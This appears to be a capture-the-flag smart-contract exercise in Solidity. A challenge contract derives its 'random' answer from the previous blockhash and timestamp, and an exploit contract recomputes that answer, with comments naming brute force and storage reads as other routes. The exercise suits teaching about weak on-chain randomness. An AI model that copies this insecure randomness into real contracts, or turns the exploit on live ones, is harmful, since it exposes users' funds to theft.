// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessRandomNumber {
    uint8 answer;

    constructor() payable {
        require(msg.value == 1 ether);
        answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (n == answer) {
            (bool ok, ) = msg.sender.call{value: 2 ether}("");
            require(ok, "Fail to send to msg.sender");
        }
    }
}

//Write your exploit codes below
contract ExploitContract {
    GuessRandomNumber public guessRandomNumber;

    function Exploit() public view returns (uint8 answer) {
        // In the tests exploit contract is deployed in the same block as GuessRandomNumber contract
        // so it is possible to simply replicate the logic of number generation.
        //
        // Alternatives would be:
        // - pass the block number and hash as an argument to the function and calc the answer
        // - iteration of all numbers from 0 to type(uint8).max and check the answer
        // - read the answer from the contract storage

        answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
    }
}
